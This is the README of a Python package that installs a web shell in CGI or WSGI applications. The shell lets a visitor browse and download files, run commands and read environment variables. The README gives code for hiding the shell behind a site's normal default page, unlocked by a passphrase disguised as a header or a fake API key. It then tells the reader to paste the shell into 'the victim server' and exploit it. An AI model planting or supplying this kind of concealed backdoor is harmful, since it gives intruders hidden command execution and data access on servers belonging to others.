# PyWCGIshell

## Description

This package implement a WebShell for CGI and WSGI server.

With this WebShell you can:
 - explore directories and download files
 - execute command lines (with command history)
 - show basic informations about environment server
 - show environments variables

## Requirements

This package require :
 - python3
 - python3 Standard Library

## Installation
```bash
pip install PyWCGIshell
```

## Usages

### Command line

(Command line is useful to try the webshell)

```bash
python3 -m PyWCGIshell wsgi # Try it in wsgi mode
```

### Python script

#### CGI page

```python
from PyWCGIshell import WebShell

def my_default_cgi_page():
	print("Content-type:text/plain; charset=utf-8")
	print("")
	print("Hello World !")

webshell = WebShell()
webshell.standard_page = my_default_cgi_page
webshell.run()
```

#### WSGI page

```python
from PyWCGIshell import WebShell

def my_default_wsgi_page(environ, start_response):
    status = '200 OK'
    headers = [('Content-type', 'text/plain; charset=utf-8')]
    start_response(status, headers)
    return [b"Hello World !"]

webshell = WebShell(type_="wsgi")
webshell.standard_page = my_default_wsgi_page
application = webshell.run
# Apache with mod_wsgi use the "application" as default function
```

#### WebShell options

```python
from PyWCGIshell import WebShell

webshell = WebShell(type_="cgi", passphrase="SHELL", pass_type="method")
webshell.run()
```
I don't recommend using `method` like `pass_type` to hide your WebShell.

You can use similar configuration to hide your WebShell.
```python
from PyWCGIshell import WebShell

webshell = WebShell(type_="wsgi", passphrase="<inexistant api key>", pass_type="header_value")
application = webshell.run
```

To use this WebShell:
 - Configure (server type, passphrase and passphrase location) and copy the WebShell code or install it
 - Paste it in the default page of the victim server or import it
 - Send a request with the passphrase and exploit the weak server

## Links

 - [Github Page](https://github.com/mauricelambert/PyWCGIshell/)
 - [Documentation](https://mauricelambert.github.io/info/python/security/PyWCGIshell.html)
 - [Pypi package](https://pypi.org/project/PyWCGIshell/)

## Licence

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
